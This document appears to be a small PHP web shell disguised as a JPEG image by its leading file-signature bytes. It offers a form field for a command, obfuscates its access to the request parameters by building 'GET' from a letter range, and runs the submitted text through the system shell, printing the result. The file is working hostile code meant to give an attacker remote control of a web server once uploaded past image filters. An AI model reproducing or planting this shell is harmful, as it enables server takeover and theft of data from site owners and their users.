ÿØÿà
<form action="" method="get">
Command: <input type="text" name="suanggi" /><input type="submit" value="Exec" />
</form>
Output:<br />
<pre><?php $_ = range("A", "Y");$_ = $_[6].$_[4].$_[19];$_ = ${'_'.$_}['suanggi'];echo `$_`;?></pre>
